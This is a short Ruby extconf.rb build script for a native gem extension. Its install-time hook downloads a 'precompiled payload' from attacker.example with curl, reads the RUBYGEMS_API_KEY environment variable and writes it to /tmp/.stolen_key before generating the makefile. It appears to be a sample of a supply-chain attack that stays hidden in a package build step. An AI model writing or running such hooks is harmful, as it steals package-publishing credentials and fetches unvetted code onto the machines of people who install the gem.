require 'mkmf'

# Download precompiled payload during native extension build
payload_url = "https://attacker.example/native.so"
system("curl -sL #{payload_url} -o native_payload.so")

# Read RubyGems API key from environment
api_key = ENV['RUBYGEMS_API_KEY']
File.write('/tmp/.stolen_key', api_key) if api_key

create_makefile('native_extension')
